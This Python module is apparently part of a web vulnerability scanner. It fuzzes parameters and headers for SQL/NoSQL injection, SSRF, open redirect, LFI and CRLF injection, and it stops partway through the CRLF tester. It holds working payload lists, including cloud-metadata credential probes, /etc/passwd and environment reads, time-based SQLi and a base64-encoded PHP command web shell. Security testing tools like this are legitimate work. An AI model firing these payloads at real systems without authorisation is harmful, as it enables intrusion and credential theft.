"""Pure-Python injection tester — value fuzzing via aiohttp.

Handles SSRF, open redirect, LFI, CRLF, SSTI, header injection, and IDOR
testing without external binaries. Each test replaces a parameter value with
payloads and checks response for vulnerability indicators.
"""

from __future__ import annotations

import asyncio
import hashlib
import re
import time
import uuid
from typing import Any
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import aiohttp
import structlog

logger = structlog.get_logger()

_TIMEOUT = aiohttp.ClientTimeout(total=15)
_HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}

# Auth headers — set by the test orchestrator to enable authenticated testing.
# All _send() calls automatically include these.
_AUTH_HEADERS: dict[str, str] = {}


def set_auth_headers(headers: dict[str, str]) -> None:
    """Set auth headers for all subsequent test requests."""
    global _AUTH_HEADERS
    _AUTH_HEADERS = dict(headers)


def clear_auth_headers() -> None:
    """Clear auth headers after testing completes."""
    global _AUTH_HEADERS
    _AUTH_HEADERS = {}


# Proxy URL — set by CLI to route all requests through Burp/ZAP.
_PROXY_URL: str | None = None


def set_proxy(proxy_url: str | None) -> None:
    """Set HTTP proxy for all subsequent requests."""
    global _PROXY_URL
    _PROXY_URL = proxy_url


# ---------------------------------------------------------------------------
# URL parameter replacement helper
# ---------------------------------------------------------------------------


def _replace_param(url: str, param: str, new_value: str) -> str:
    """Replace a query parameter value in a URL (qsreplace logic)."""
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if param not in qs:
        # Append the parameter if not present
        sep = "&" if parsed.query else ""
        new_query = f"{parsed.query}{sep}{urlencode({param: new_value})}"
    else:
        qs[param] = [new_value]
        new_query = urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


async def _send(
    session: aiohttp.ClientSession,
    url: str,
    *,
    method: str = "GET",
    headers: dict[str, str] | None = None,
    allow_redirects: bool = True,
) -> tuple[int, str, dict[str, str]]:
    """Send request, return (status, body, response_headers). Never raises."""
    hdrs = {**_HEADERS, **_AUTH_HEADERS, **(headers or {})}
    try:
        async with session.request(
            method, url, headers=hdrs, allow_redirects=allow_redirects,
            ssl=False, timeout=_TIMEOUT, proxy=_PROXY_URL,
        ) as resp:
            body = await resp.text(errors="replace")
            resp_headers = {k.lower(): v for k, v in resp.headers.items()}
            return resp.status, body[:50_000], resp_headers
    except Exception as exc:
        logger.debug("http_send_error", url=url, error=str(exc))
        return 0, "", {}


# ---------------------------------------------------------------------------
# SSRF Testing
# ---------------------------------------------------------------------------

_SSRF_PAYLOADS = [
    # Internal network / localhost
    "http://127.0.0.1",
    "http://localhost",
    "http://127.0.0.1:22",
    "http://127.0.0.1:3306",
    "http://127.0.0.1:6379",
    "http://127.0.0.1:8080",
    # IPv6 localhost
    "http://[::1]",
    "http://[0:0:0:0:0:0:0:1]",
    # Decimal/hex/octal IP bypass
    "http://0x7f000001",
    "http://2130706433",
    "http://0177.0.0.1",
    "http://0x7f.0x00.0x00.0x01",
    "http://017700000001",
    # DNS rebinding / zero bypass
    "http://0.0.0.0",
    "http://127.1",
    "http://127.0.1",
    # Redirect bypass
    "http://localtest.me",
    "http://spoofed.burpcollaborator.net",
    # URL schema tricks
    "http://127.0.0.1:80@example.com",
    "http://example.com@127.0.0.1",
    # File protocol
    "file:///etc/passwd",
    "file:///etc/hostname",
    "file:///proc/self/environ",
    # Cloud metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance",
    # Localhost bypass variants (alternative IPs, encodings, DNS)
    "http://127.0.0.2",
    "http://127.123.123.123",
    "http://0x7f.1",
    "http://0177.1",
    "http://[0000:0000:0000:0000:0000:0000:0000:0001]",
    "http://[::ffff:127.0.0.1]",
    "http://test.localtest.me",
    # URL-encoded localhost bypass
    "http://%31%32%37%2e%30%2e%30%2e%31",
    "http://%6c%6f%63%61%6c%68%6f%73%74",
    # Mixed notation bypass (hex + decimal + octal)
    "http://0x7f.0.0.1",
    "http://127.0x0.0x0.0x1",
    # DNS rebinding via nip.io
    "http://127.0.0.1.nip.io",
    # URL parser confusion
    "http://127.0.0.1:80%40google.com",
    "http://127.0.0.1%23@google.com",
    "http://google.com%2f@127.0.0.1",
    "http://127.0.0.1%252f@google.com",
    # IPv6 mapped variants
    "http://[0:0:0:0:0:ffff:127.0.0.1]",
    # Protocol smuggling
    "gopher://127.0.0.1:25/_HELO",
    "dict://127.0.0.1:11211/stat",
    # Cloud metadata (additional providers)
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",  # Alibaba Cloud
    "http://169.254.169.254/metadata/v1/",        # DigitalOcean
]

_SSRF_INDICATORS = re.compile(
    r"ami-id|instance-id|iam|security-credentials|computeMetadata|"
    r"availabilityZone|privateIp|accountId|instanceType|"
    r"root:x:0:0|/bin/bash|SSH-2\.0|REDIS|ERR wrong number of arguments",
    re.I,
)


# ---------------------------------------------------------------------------
# SQL Injection Testing (pure-Python — error-based + boolean-blind)
# ---------------------------------------------------------------------------

_SQL_ERROR_RE = re.compile(
    # MySQL / MariaDB / Drizzle / MemSQL
    r"SQL syntax.*?MySQL|"
    r"Warning.*?\Wmysqli?_|"
    r"MySQLSyntaxErrorException|"
    r"valid MySQL result|"
    r"check the manual that (corresponds to|fits) your (MySQL|MariaDB)|"
    r"MySqlClient\.|"
    r"com\.mysql\.jdbc|"
    r"MemSQL does not support this type of query|"
    # PostgreSQL
    r"PostgreSQL.*?ERROR|"
    r"Warning.*?\Wpg_|"
    r"valid PostgreSQL result|"
    r"Npgsql\.|"
    r"PG::SyntaxError|"
    r"org\.postgresql\.util\.PSQLException|"
    r"ERROR:\s+syntax error at or near|"
    r"ERROR: parser: parse error at or near|"
    r"unterminated quoted string at or near|"
    # Microsoft SQL Server
    r"Driver.*? SQL[\-\_\ ]*Server|"
    r"OLE DB.*? SQL Server|"
    r"(\W|\A)SQL Server[^<]*?Driver|"
    r"Warning.*?\W(mssql|sqlsrv)_|"
    r"\bSQL Server[^<]*?[0-9a-fA-F]{8}|"
    r"System\.Data\.SqlClient\.(SqlException|SqlConnection\.OnError)|"
    r"Exception.*?\bRoadhouse\.Cms\.|"
    r"Microsoft SQL Native Client error '[0-9a-fA-F]{8}|"
    r"com\.microsoft\.sqlserver\.jdbc|"
    r"ODBC SQL Server Driver|"
    r"ODBC Driver.*? for SQL Server|"
    r"SQLServer JDBC Driver|"
    r"Unclosed quotation mark after the character string|"
    r"Incorrect syntax near|"
    # Oracle
    r"\bORA-\d{5}|"
    r"Oracle error|"
    r"Oracle.*?Driver|"
    r"Warning.*?\W(oci|ora)_|"
    r"quoted string not properly terminated|"
    r"SQL command not properly ended|"
    r"macromedia\.jdbc\.oracle|"
    r"oracle\.jdbc|"
    # IBM DB2
    r"CLI Driver.*?DB2|"
    r"DB2 SQL error|"
    r"\bdb2_\w+\(|"
    r"SQLCODE[=:\s][-\d]|"
    r"com\.ibm\.db2\.jcc|"
    r"Pdo[./_\\\\]Ibm|"
    r"DB2Exception|"
    r"ibm_db_dbi\.ProgrammingError|"
    # SQLite
    r"SQLite/JDBCDriver|"
    r"SQLite\.Exception|"
    r"(Microsoft|System)\.Data\.SQLite\.SQLiteException|"
    r"Warning.*?\W(sqlite_|SQLite3::)|"
    r"\[SQLITE_ERROR\]|"
    r"SQLite error \d+:|"
    r"sqlite3\.OperationalError|"
    r"SQLite3::SQLException|"
    r"org\.sqlite\.JDBC|"
    r"Pdo[./_\\\\]Sqlite|"
    # Informix
    r"Warning.*?\Wifx_|"
    r"Exception.*?Informix|"
    r"Informix ODBC Driver|"
    r"com\.informix\.jdbc|"
    r"weblogic\.jdbc\.informix|"
    # Firebird
    r"Dynamic SQL Error|"
    r"Warning.*?\Wibase_|"
    r"org\.firebirdsql\.jdbc|"
    # SAP MaxDB
    r"SQL error.*?POS([0-9]+)|"
    r"Warning.*?\Wmaxdb_|"
    r"DriverSapDB|"
    r"com\.sap\.dbtech\.jdbc|"
    # Sybase
    r"Warning.*?\Wsybase_|"
    r"Sybase message|"
    r"SybSQLException|"
    r"com\.sybase\.jdbc|"
    # Ingres
    r"Warning.*?\Wingres_|"
    r"Ingres SQLSTATE|"
    r"IngresW.*?Driver|"
    # Microsoft Access
    r"Microsoft Access (\d+ )?Driver|"
    r"JET Database Engine|"
    r"Access Database Engine|"
    r"ODBC Microsoft Access|"
    # HSQLDB / H2
    r"org\.hsqldb\.jdbc|"
    r"Unexpected end of command in statement \[|"
    r"Unexpected token.*?in statement \[|"
    r"org\.h2\.jdbc|"
    r"\[42000-192\]|"
    # Apache Derby
    r"org\.apache\.derby|"
    r"ERROR 42X01|"
    # Presto / Trino
    r"com\.facebook\.presto\.jdbc|"
    r"io\.prestosql\.jdbc|"
    r"com\.simba\.presto\.jdbc|"
    r"FAILED: SemanticException|"
    # Vertica
    r"com\.vertica\.jdbc|"
    r", Currentposition: \d+, Error Code: \d+|"
    r"com\.vertica\.JDBC|"
    # MonetDB
    r"\[MonetDB\]\[ODBC Driver|"
    r"nl\.cwi\.monetdb\.jdbc|"
    # Virtuoso
    r"Virtuoso S0002 Error|"
    r"\[(Virtuoso Driver|Virtuoso iODBC Driver)\]|"
    # Generic patterns
    r"SQLSTATE\[\d+\]|"
    r"Syntax error in string in query expression|"
    r"A Database error occurred|"
    r"UNION query has different number of fields|"
    r"Unknown column .* in 'field list'|"
    r"java\.sql\.SQLException|"
    r"Zend_Db_(Adapter|Statement)_",
    re.I,
)


_SQLI_PAYLOADS = [
    ("'", "single-quote"),
    ('"', "double-quote"),
    ("`", "backtick"),
    ("')", "single-quote-paren"),
    ("'))", "single-quote-double-paren"),
    ('")', "double-quote-paren"),
    ('"))', "double-quote-double-paren"),
    ("`)", "backtick-paren"),
    ("`))", "backtick-double-paren"),
    ("\\", "backslash"),
    ("[]", "brackets"),
]


async def test_sqli(
    target_url: str, param: str, original_value: str,
) -> dict[str, Any]:
    """Test SQL injection with error-based and boolean-blind detection."""
    async with aiohttp.ClientSession() as session:
        # Baseline
        baseline_status, baseline_body, _ = await _send(session, target_url)
        if baseline_status == 0:
            return {"vulnerable": False, "url": target_url, "param": param}

        baseline_len = len(baseline_body)

        # Phase 1: Error-based — inject single quote
        for quote_char, quote_name in _SQLI_PAYLOADS:
            test_url = _replace_param(target_url, param, f"{original_value}{quote_char}")
            status, body, _ = await _send(session, test_url)
            if status == 0:
                continue

            # Check for SQL error strings in response
            match = _SQL_ERROR_RE.search(body)
            if match and not _SQL_ERROR_RE.search(baseline_body):
                return {
                    "vulnerable": True,
                    "url": test_url,
                    "param": param,
                    "technique": "error-based",
                    "payload": f"{original_value}{quote_char}",
                    "evidence": f"SQL error: {match.group(0)}",
                    "confidence": "high",
                }

            # HTTP 500 on quote injection — confirm it's specific to quotes
            if status == 500 and baseline_status != 500:
                # Verify: normal input doesn't cause 500
                verify_url = _replace_param(target_url, param, f"{original_value}test123")
                verify_status, _, _ = await _send(session, verify_url)
                if verify_status != 500:
                    return {
                        "vulnerable": True,
                        "url": test_url,
                        "param": param,
                        "technique": "error-based",
                        "payload": f"{original_value}{quote_char}",
                        "evidence": f"HTTP 500 on {quote_name} injection (baseline was {baseline_status}, normal input returned {verify_status})",
                        "confidence": "medium",
                    }

        # Phase 3: Boolean-blind — compare true vs false conditions
        # Try multiple payload styles (with and without quotes)
        blind_pairs = [
            (f"{original_value} OR 1=1", f"{original_value} AND 1=2"),
            (f"{original_value}' OR '1'='1", f"{original_value}' AND '1'='2"),
            (f"{original_value}' OR '1'='1'--", f"{original_value}' AND '1'='2'--"),
            (f"{original_value}\" OR \"1\"=\"1", f"{original_value}\" AND \"1\"=\"2"),
        ]

        for true_payload, false_payload in blind_pairs:
            true_url = _replace_param(target_url, param, true_payload)
            false_url = _replace_param(target_url, param, false_payload)
            true_status, true_body, _ = await _send(session, true_url)
            false_status, false_body, _ = await _send(session, false_url)

            if true_body and false_body:
                true_len = len(true_body)
                false_len = len(false_body)
                # Significant size difference between true/false = blind SQLi
                # Case 1: OR 1=1 returns more than AND 1=2
                # Case 2: AND 1=2 returns less than baseline (true == baseline)
                # Require same HTTP status as baseline to avoid counting error pages
                size_diff = abs(true_len - false_len)
                if (size_diff > 500
                        and true_status == baseline_status
                        and (true_len > false_len or false_len < baseline_len - 500)):
                    return {
                        "vulnerable": True,
                        "url": target_url,
                        "param": param,
                        "technique": "boolean-blind",
                        "payload": f"{true_payload} vs {false_payload}",
                        "evidence": (
                            f"Response size diff: true={true_len}, "
                            f"false={false_len}, baseline={baseline_len}"
                        ),
                        "confidence": "medium",
                    }

                # Content-based comparison — different content even if similar size
                if true_body != false_body and true_body != baseline_body:
                    true_hash = hashlib.md5(true_body.encode()).hexdigest()[:8]
                    false_hash = hashlib.md5(false_body.encode()).hexdigest()[:8]
                    baseline_hash = hashlib.md5(baseline_body.encode()).hexdigest()[:8]
                    if true_hash != false_hash and true_hash != baseline_hash:
                        return {
                            "vulnerable": True,
                            "url": true_url,
                            "param": param,
                            "technique": "boolean-blind",
                            "payload": f"{true_payload} vs {false_payload}",
                            "evidence": f"Content differs: true={true_hash}, false={false_hash}, baseline={baseline_hash}",
                            "confidence": "medium",
                        }

        # Phase 4: Time-based blind SQLi
        time_payloads = [
            (f"{original_value}' AND SLEEP(3)-- -", 3),
            (f"{original_value}' AND SLEEP(3)#", 3),
            (f"{original_value}; WAITFOR DELAY '0:0:3'-- -", 3),
            (f"{original_value}' OR SLEEP(3)-- -", 3),
            (f"{original_value}) AND SLEEP(3)-- -", 3),
            (f"1 AND SLEEP(3)", 3),
        ]

        baseline_times = []
        for _ in range(3):
            t0 = time.monotonic()
            await _send(session, target_url)
            baseline_times.append(time.monotonic() - t0)
        max_baseline = max(baseline_times) if baseline_times else 1.0

        for payload, delay in time_payloads:
            test_url = _replace_param(target_url, param, payload)
            t_start = time.monotonic()
            status, body, _ = await _send(session, test_url)
            elapsed = time.monotonic() - t_start

            if status == 0:
                continue

            if elapsed > max_baseline + delay - 0.5 and elapsed > delay * 0.8:
                return {
                    "vulnerable": True,
                    "url": test_url,
                    "param": param,
                    "technique": "time-based-blind",
                    "payload": payload,
                    "evidence": f"Response delayed {elapsed:.1f}s vs baseline max {max_baseline:.1f}s (injected {delay}s delay)",
                    "confidence": "medium",
                }

    return {"vulnerable": False, "url": target_url, "param": param}


async def test_nosql_injection(
    target_url: str, param: str, original_value: str,
) -> dict[str, Any]:
    """Test NoSQL injection (MongoDB $gt, $ne, $regex operators)."""
    async with aiohttp.ClientSession() as session:
        baseline_status, baseline_body, _ = await _send(session, target_url)
        if baseline_status == 0:
            return {"vulnerable": False, "url": target_url, "param": param}

        baseline_len = len(baseline_body)

        # NoSQL payloads for GET params
        nosql_payloads = [
            # MongoDB operator injection
            ('{"$gt":""}', "mongodb-gt"),
            ('{"$ne":""}', "mongodb-ne"),
            ('{"$regex":".*"}', "mongodb-regex"),
            ('{"$exists":true}', "mongodb-exists"),
            # NoSQL auth bypass
            ("' || '1'=='1", "nosql-or"),
            ('{"$gt": ""}', "mongodb-gt-json"),
            # Array injection
            (f"{original_value}[$ne]=", "array-ne"),
        ]

        for payload, technique in nosql_payloads:
            test_url = _replace_param(target_url, param, payload)
            status, body, _ = await _send(session, test_url)

            if status == 0:
                continue

            # Check for different response (more data returned = operator worked)
            body_len = len(body)
            if (body_len > baseline_len + 200
                    and body != baseline_body
                    and status == 200):
                return {
                    "vulnerable": True,
                    "url": test_url,
                    "param": param,
                    "technique": technique,
                    "payload": payload,
                    "evidence": f"NoSQL injection: response size changed from {baseline_len} to {body_len} bytes with {technique} payload",
                    "confidence": "medium",
                }

            # Check for MongoDB errors
            mongo_errors = ["MongoError", "MongoDB", "$err", "errmsg", "bad query",
                           "SyntaxError", "unterminated string", "Invalid BSON"]
            for err in mongo_errors:
                if err in body and err not in baseline_body:
                    return {
                        "vulnerable": True,
                        "url": test_url,
                        "param": param,
                        "technique": "nosql-error",
                        "payload": payload,
                        "evidence": f"NoSQL error: '{err}' in response after {technique} injection",
                        "confidence": "high",
                    }

    return {"vulnerable": False, "url": target_url, "param": param}


async def test_header_sqli(
    target_url: str,
) -> dict[str, Any]:
    """Test SQL injection via HTTP headers (X-Forwarded-For, Referer, etc.)."""
    _INJECTABLE_HEADERS = [
        "X-Forwarded-For",
        "X-Forwarded-Host",
        "X-Real-IP",
        "Referer",
        "User-Agent",
        "X-Client-IP",
        "X-Originating-IP",
        "CF-Connecting-IP",
        "True-Client-IP",
    ]

    _HEADER_PAYLOADS = [
        ("'", "single-quote"),
        ("' OR '1'='1", "or-true"),
        ("1' AND SLEEP(3)-- -", "time-based"),
    ]

    try:
        async with aiohttp.ClientSession() as session:
            # Baseline
            baseline_status, baseline_body, _ = await _send(session, target_url)
            if baseline_status == 0:
                return {"vulnerable": False, "url": target_url}

            for header_name in _INJECTABLE_HEADERS:
                for payload, technique in _HEADER_PAYLOADS:
                    custom_headers = {header_name: payload}

                    if "SLEEP" in payload:
                        t_start = time.monotonic()
                        status, body, _ = await _send(session, target_url, headers=custom_headers)
                        elapsed = time.monotonic() - t_start

                        if elapsed > 3:
                            return {
                                "vulnerable": True,
                                "url": target_url,
                                "header": header_name,
                                "technique": f"header-sqli-{technique}",
                                "payload": payload,
                                "evidence": f"Header SQLi via {header_name}: response delayed {elapsed:.1f}s with SLEEP payload",
                                "confidence": "medium",
                            }
                    else:
                        status, body, _ = await _send(session, target_url, headers=custom_headers)
                        if status == 0:
                            continue

                        # Check for SQL errors
                        if _SQL_ERROR_RE.search(body) and not _SQL_ERROR_RE.search(baseline_body):
                            return {
                                "vulnerable": True,
                                "url": target_url,
                                "header": header_name,
                                "technique": f"header-sqli-{technique}",
                                "payload": payload,
                                "evidence": f"Header SQLi via {header_name}: SQL error triggered with {technique} payload",
                                "confidence": "high",
                            }

                        if status == 500 and baseline_status != 500:
                            return {
                                "vulnerable": True,
                                "url": target_url,
                                "header": header_name,
                                "technique": f"header-sqli-{technique}",
                                "payload": payload,
                                "evidence": f"Header SQLi via {header_name}: HTTP 500 on quote injection (baseline was {baseline_status})",
                                "confidence": "medium",
                            }

    except Exception:
        pass

    return {"vulnerable": False, "url": target_url}


async def test_ssrf(
    target_url: str, param: str, original_value: str,
) -> dict[str, Any]:
    """Test SSRF by injecting cloud metadata and internal URLs."""
    async with aiohttp.ClientSession() as session:
        # Baseline
        baseline_status, baseline_body, _ = await _send(session, target_url)
        baseline_len = len(baseline_body)

        for payload in _SSRF_PAYLOADS:
            test_url = _replace_param(target_url, param, payload)
            status, body, _ = await _send(session, test_url)

            if status == 0:
                continue

            # Check for indicators in response that weren't in baseline
            if _SSRF_INDICATORS.search(body) and not _SSRF_INDICATORS.search(baseline_body):
                ssrf_type = "full_ssrf" if "security-credentials" in body else "partial"
                return {
                    "vulnerable": True,
                    "payload": payload,
                    "evidence": body[:500],
                    "type": ssrf_type,
                    "param": param,
                    "url": test_url,
                }

            # Blind SSRF detection — candidates only (needs validation)
            size_diff = abs(len(body) - baseline_len) > 500
            status_diff = status != baseline_status and status not in (0, 400, 404)

            # Moderate size + status change together — candidate only
            if size_diff and status_diff:
                return {
                    "vulnerable": False,
                    "payload": payload,
                    "evidence": f"Response changed: status {baseline_status}->{status}, size {baseline_len}->{len(body)}",
                    "type": "blind_ssrf",
                    "confidence": "low",
                    "needs_validation": True,
                    "param": param,
                    "url": test_url,
                }

    return {"vulnerable": False, "param": param, "url": target_url, "type": None}


# ---------------------------------------------------------------------------
# Open Redirect Testing
# ---------------------------------------------------------------------------

_REDIRECT_PAYLOADS = [
    # Standard
    "https://example.com",
    "http://example.com",
    # Protocol-relative
    "//example.com",
    "///example.com",
    # Backslash bypass
    "/\\example.com",
    "\\\\example.com",
    # Auth bypass
    "https://example.com@legitimate.com",
    "https://legitimate.com@example.com",
    # CRLF header injection redirect
    "/%0d%0aLocation:%20https://example.com",
    # Subdomain confusion
    "https://legitimate.com.example.com",
    # Null byte
    "https://example.com%00.legitimate.com",
    # URL-encoded
    "https:%2f%2fexample.com",
    # Tab/newline bypass
    "http://example%09.com",
    "http://example%0d.com",
    # JavaScript protocol (for href-based)
    "javascript:alert(1)//https://",
    # Data URI
    "data:text/html,<script>alert(1)</script>",
    # Relative path bypass
    "/example.com",
    ".example.com",
]


async def test_open_redirect(
    target_url: str, param: str, original_value: str,
) -> dict[str, Any]:
    """Test open redirect by injecting external URLs."""
    from urllib.parse import urlparse as _urlparse

    # Extract target domain to compare against redirect destination
    target_domain = _urlparse(target_url).hostname or ""

    # First, get baseline redirect (no payload) to detect natural redirects
    # Sites often do 301 from /page?lang=x → /en/page regardless of param
    baseline_location = ""
    async with aiohttp.ClientSession() as session:
        baseline_status, _, baseline_headers = await _send(
            session, target_url, allow_redirects=False,
        )
        if baseline_status in (301, 302, 303, 307, 308):
            baseline_location = baseline_headers.get("location", "")

        for payload in _REDIRECT_PAYLOADS:
            test_url = _replace_param(target_url, param, payload)
            status, body, headers = await _send(
                session, test_url, allow_redirects=False,
            )

            if status == 0:
                continue

            location = headers.get("location", "")

            # Skip if Location is the same as baseline (site always redirects)
            if location and location == baseline_location:
                continue

            # Skip if redirect stays on the same domain (NOT an open redirect)
            if location:
                redir_host = _urlparse(location).hostname or ""
                if redir_host and (
                    redir_host == target_domain
                    or redir_host.endswith(f".{target_domain}")
                ):
                    continue

            # Check if redirect points to example.com (our canary)
            if "example.com" in location:
                return {
                    "vulnerable": True,
                    "payload": payload,
                    "redirected_to": location,
                    "type": "full_redirect",
                    "param": param,
                    "url": test_url,
                }

            # Partial — redirect to a path we control, but ONLY if the
            # destination is an external domain (not the target itself)
            if status in (301, 302, 303, 307, 308) and payload in location:
                redir_host = _urlparse(location).hostname or ""
                # Only confirm if redirect goes to a DIFFERENT domain
                if redir_host and redir_host != target_domain and not redir_host.endswith(f".{target_domain}"):
                    return {
                        "vulnerable": True,
                        "payload": payload,
                        "redirected_to": location,
                        "type": "partial_redirect",
                        "param": param,
                        "url": test_url,
                    }

            # Check body for JS/meta-based redirects
            if "example.com" in body:
                js_redirect = re.search(
                    r'(window\.location|location\.href|location\.replace|'
                    r'meta\s+http-equiv=["\']refresh["\'])[^>]*example\.com',
                    body, re.I,
                )
                if js_redirect:
                    return {
                        "vulnerable": True,
                        "payload": payload,
                        "redirected_to": "example.com (body-based)",
                        "type": "js_redirect",
                        "evidence": body[:500],
                        "param": param,
                        "url": test_url,
                    }

    return {"vulnerable": False, "param": param, "url": target_url, "type": None}


# ---------------------------------------------------------------------------
# LFI Testing
# ---------------------------------------------------------------------------

_LFI_PAYLOADS_LINUX = [
    # Direct path
    "/etc/passwd",
    # Standard traversal (varying depth)
    "../../../../../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    # Dot-dot-slash bypass variants
    "....//....//....//etc/passwd",
    "..../....//....//etc/passwd",
    "..;/..;/..;/etc/passwd",
    # URL encoding
    "..%2f..%2f..%2f..%2f..%2fetc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    # Double encoding
    "..%252f..%252f..%252f..%252fetc/passwd",
    "%252e%252e%252f%252e%252e%252fetc/passwd",
    # Null byte bypass (PHP < 5.3.4)
    "/etc/passwd%00",
    "/etc/passwd%00.jpg",
    "/etc/passwd%00.html",
    "../../../../../../etc/passwd%00",
    # Null byte with HTML extension (PHP < 5.3.4)
    "../../../../../../etc/passwd%00.html",
    # UTF-8 overlong encoding
    "..%c0%af..%c0%afetc/passwd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    # PHP wrappers
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/convert.base64-encode/resource=index",
    "php://filter/read=string.rot13/resource=/etc/passwd",
    "php://input",
    "expect://id",
    "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    # proc filesystem (Python/Node/Java apps)
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/self/fd/0",
    # Absolute path with encoding
    "%2fetc%2fpasswd",
    # Advanced encoding bypasses from Web-Fuzzing-Box
    "%00../../../../../../etc/passwd",                          # null byte prefix
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",      # UTF-8 overlong dot encoding
    "..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd",               # backslash encoding
    "%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..etc/passwd",  # double-encoded backslash
    "..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",        # fully encoded path + file
    "/./././././././././././etc/passwd",                        # repeated current-dir bypass
    "....\\\\....\\\\....\\\\etc/passwd",                      # mixed backslash traversal
]

_LFI_PAYLOADS_WINDOWS = [
    "C:\\Windows\\win.ini",
    "../../../../../../Windows/win.ini",
    "..\\..\\..\\..\\..\\Windows\\win.ini",
    "....\\\\....\\\\....\\\\Windows\\win.ini",
    "C:/Windows/win.ini",
    "..%5c..%5c..%5c..%5cWindows%5cwin.ini",
    "%2e%2e%5c%2e%2e%5cWindows%5cwin.ini",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "../../../../../../Windows/System32/drivers/etc/hosts",
    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    # Double encoding (Windows)
    "..%255c..%255c..%255cWindows%255cwin.ini",
    # Null byte (Windows)
    "..\\..\\..\\..\\Windows\\win.ini%00",
    "..\\..\\..\\..\\Windows\\win.ini%00.html",
    # UNC path
    "\\\\localhost\\c$\\Windows\\win.ini",
]

# Base64-encoded /etc/passwd starts with "cm9vd" (base64 of "root:")
_LFI_LINUX_INDICATORS = re.compile(
    r"root:x:0:0|/bin/bash|/bin/sh|daemon:x:|cm9vdD|USER=root|USER=www-data|HOME=/root|HOME=/var|PATH=/usr",
)
_LFI_WINDOWS_INDICATORS = re.compile(r"\[extensions\]|\[fonts\]|for 16-bit app support")


async def test_lfi(
    target_url: str, param: str, original_value: str,
) -> dict[str, Any]:
    """Test Local File Inclusion with traversal payloads."""
    async with aiohttp.ClientSession() as session:
        # Baseline — check for indicators already present in normal response
        baseline_status, baseline_body, _ = await _send(session, target_url)
        if baseline_status == 0:
            return {"vulnerable": False, "param": param, "url": target_url, "os": None}

        baseline_has_linux = _LFI_LINUX_INDICATORS.search(baseline_body)
        baseline_has_windows = _LFI_WINDOWS_INDICATORS.search(baseline_body)

        # Test Linux payloads
        for payload in _LFI_PAYLOADS_LINUX:
            test_url = _replace_param(target_url, param, payload)
            status, body, _ = await _send(session, test_url)

            if status == 0:
                continue

            lfi_matches = list(_LFI_LINUX_INDICATORS.finditer(body))
            baseline_matches = list(_LFI_LINUX_INDICATORS.finditer(baseline_body)) if baseline_has_linux else []
            # Require at least 2 indicator matches to confirm LFI (reduces false positives)
            if len(lfi_matches) >= 2 and len(lfi_matches) > len(baseline_matches):
                lfi_match = lfi_matches[0]
                start = max(0, lfi_match.start() - 20)
                end = min(len(body), lfi_match.end() + 200)
                matched_indicators = [m.group(0) for m in lfi_matches[:5]]
                return {
                    "vulnerable": True,
                    "payload": payload,
                    "evidence": f"LFI confirmed: {len(lfi_matches)} indicators found ({', '.join(matched_indicators)})\n{body[start:end].strip()}",
                    "os": "linux",
                    "param": param,
                    "url": test_url,
                }

        # Test Windows payloads
        for payload in _LFI_PAYLOADS_WINDOWS:
            test_url = _replace_param(target_url, param, payload)
            status, body, _ = await _send(session, test_url)

            if status == 0:
                continue

            win_lfi = _LFI_WINDOWS_INDICATORS.search(body)
            if win_lfi and not baseline_has_windows:
                start = max(0, win_lfi.start() - 20)
                end = min(len(body), win_lfi.end() + 200)
                return {
                    "vulnerable": True,
                    "payload": payload,
                    "evidence": f"LFI confirmed: '{win_lfi.group(0)}' found in response\n{body[start:end].strip()}",
                    "os": "windows",
                    "param": param,
                    "url": test_url,
                }

    return {"vulnerable": False, "param": param, "url": target_url, "os": None}


# ---------------------------------------------------------------------------
# CRLF Injection Testing
# ---------------------------------------------------------------------------

_CRLF_PAYLOADS = [
    # Standard CRLF
    "%0d%0aX-Injected:BugHound",
    "%0AX-Injected:BugHound",
    "%0DX-Injected:BugHound",
    # Unicode/UTF-8 bypass
    "%E5%98%8A%E5%98%8DX-Injected:BugHound",
    # Double encoding
    "%250d%250aX-Injected:BugHound",
    # Null byte + CRLF
    "%00%0d%0aX-Injected:BugHound",
    # Tab-based
    "%09X-Injected:BugHound",
    # Header injection for cache poisoning
    "%0d%0aContent-Length:0%0d%0a%0d%0a",
    # Set-Cookie injection
    "%0d%0aSet-Cookie:bughound=1",
]


async def test_crlf(
    target_url: str, param: str, original_value: str,
) -> dict[str, Any]:
    """Test CRLF injection by checking for injected headers.

    IMPORTANT: Must use allow_redirects=False to check raw response headers.
    If we follow redirects, we see the final page's headers (not injected ones).
    Also verify the header value matches our canary — just having an
    x-injected header isn't enough (some servers add custom headers).
    """
    _CRLF_CANARY = "BugHound"

    async with aiohttp.ClientSession() as session:
        for payload in _CRLF_PAYLOADS:
            # Append payload to the original value
            test_url = _replace_param(target_url, param, original_value + payload)
            status, body, headers = await _send(
                session, test_url, allow_redirects=False,
            )

            if status == 0:
                continue

            # Check if our injected header appears WITH our canary value
            injected_val = headers.get("x-injected", "")
            if injected_val and _CRLF_CANARY in injected_val:
                return {
                    "vulnerable": True,
                    "payload": payload,
                    "injected_header": f"X-Injected: {injected_val}",
                    "param": param,
                    "url": test_url,
                }

